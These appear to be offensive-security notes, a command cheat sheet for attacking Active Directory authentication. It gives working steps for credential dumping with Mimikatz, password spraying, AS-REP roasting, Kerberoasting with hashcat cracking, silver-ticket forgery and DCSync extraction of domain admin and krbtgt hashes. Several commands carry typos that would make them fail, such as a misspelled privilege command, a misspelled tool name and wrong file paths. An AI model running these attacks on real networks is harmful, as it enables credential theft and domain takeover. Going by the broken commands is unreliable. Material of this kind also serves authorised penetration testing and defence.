# AD authentication attacks

## Principle - Cached creds

Credentials are hashed and stored to save authentication processes.

### Hashes - ideal case

https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

With the `SeDebugPrivilege` privilege (works with __local admins__):
```
PS > .\mimikatz.exe
m $ privelege::debug
m $ sekurlsa::logonpasswords
```

### Tickets - retrival of TGT and TGS

In another terminal:
```
PS2 > dir \\some_other_host\smb\some_share # in another terminal
```
and back in Mimikatz:
```
m $ sekurlsa::tickets
```

## Authentication attacks

### Passwords

#### Lockout

Lockout threshold for password attacks:
```
net accounts
```

#### LDAP password attack using AD authentication - Principle

LDAP query with user and password authentication:
```
# Building the query
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $pdc + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
$searchString += $distinguishedName

# Authentication attack
New-Object System.DirectoryServices.DirectoryEntry($searchString, "someuser", "somepass")
```

#### LDAP spray password attack - "Spray-passwords" script 

Spray-passwords on GitHub: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```
PS > powershell -ep bypass
PS > .\Spray-Passwords.ps1 -Pass somepass -Admin
```

#### SMB attacks - crackmapexec

CrackMapExec GitHub: https://github.com/Porchetta-Industries/CrackMapExec

```
kali $ vi userstohack.txt
kali $ crapmapexec smb $targetIp -u userstoattack.txt -p 'somepassword' -d targetorganisation.com --continue-on-success
kali $ crapmapexec smb $targetIpRange.1-254 -u user -p 'password' -d targetorganisation.com --continue-on-success
```
Warning: can lock users out

#### Kerbrute

Kerbrute on GitHub: 
- https://github.com/ropnop/kerbrute
- https://github.com/ropnop/kerbrute/releases

```
PS > type userstohack.txt
PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.txt 'somepassword'
```

### AS-REQ Roasting

Retrieves hashes used by regular users.

Takes _Do not require Kerberos preauthentication_ to be enabled (disabled by default).

#### From Linux with Impacket-GetNPUsers

Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
```
$ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/any_user
$ hashcat --help | grep -i 'kerberos' # look for "AS-REP" in this case
$ hashcat -m 18200 hashes_as-rep_to_roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### From Windows with Rubeus

Rubeus on GitHub: https://github.com/GhostPack/Rubeus
```
PS > .\Rubeus.exe asreproast /nowrap
```
Copy the hash and crack it on Kali with `hashcat`:
```
sudo hashcat -m 18200 hashes_retrieved_with_Rubeus_on_Windows /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Users to AS-REQ roast

To get only the users with option _Do not require Kerberos preauthentication_ enabled on Linux:
```
$ impacket-GetNPUsers -dc-ip $TargetDcIp # No options
```
and on Windows:
```
Import-Module c:\path\to\powerview.ps1
Get-DomainUser -PreauthNotRequired
```

### Kerberoasting - TGS-REP on SPN

Retrieves hashes used by Service Accounts.

#### With Impacket-GetUserSPNs

Impacket-GetUserSPNs on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
```
$ impacket-GetUserSPNs -request -dc-ip $TargetDomainControlerIp organisation.com/someuser
$ hashcat --help | grep -i kerberos
$ hashcat -m 13100 spn_hash_to_hack.txt /usr/share/wordlist/rockyou.txt -r myrulefile.rule --force
```

#### With Rubeus

```
PS c:\path\to\rubeus> .\Rubeus.exe kerberoast /outfile:spn_hash_to_hack.txt
```
and crack it with `hashcat`. With `GenericWrite` or `GenericAll` permissions on another AD user: 
- https://adsecurity.org/?p=3658 (to avoid)
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)

### Silver ticket

Takes _Privileged Account Certificate_ (PAC) not to be enabled (usual): https://adsecurity.org/?p=2011
```
PS > iwr -UseDefaultCredentials http://internalwebsite # access denied
PS > c:\path\to\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords # get the webserver's service NTLM hash
PS > whoami /user # get the domain SID: S-1-5-21-xtake-ytake-ztake-donottaketheuserRID
mimikatz # kerberos::golden /sid:domainsid /domain:organisation.com /ptt /target:internalwebsite.organisation.com /service:http /rc4:ntlmhash /user:anyuser
mimikatz # exit
PS > klist
PS > iwr -UseDefaultCredentials http://internalwebsite # access granted
```

### Domain Controler Sync

Needs:
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered

which are provided by:
- Domain Admins
- Enterprise Admins
- Administrators (NOT local admins)

DCSync attack details: https://adsecurity.org/?p=2398#MimikatzDCSync \
Impacket-Secretsdump on GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

#### From Linux

```
impacket-secretsdump -just-dc-user someuser organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
hashcat -m 1000 ntlm_hash_from_impacket-secretsdump /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

impacket-secretsdump -just-dc-user Administrator organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
impacket-secretsdump -just-dc-user krbtgt organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
```

#### From Windows

From an account with _Replicating Directory Changes_ rights:
```
PS > c:\path\to\mimikatz.exe
mimikatz # lsadump::dcsync /user:mydomainname\target_username
$ hashcat -m 1000 ntlm_hash_from_mimikatz /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

mimikatz # lsadump::dcsync /user:mydomainname\Administrator
mimikatz # lsadump::dcsync /user:mydomainname\krbtgt
```



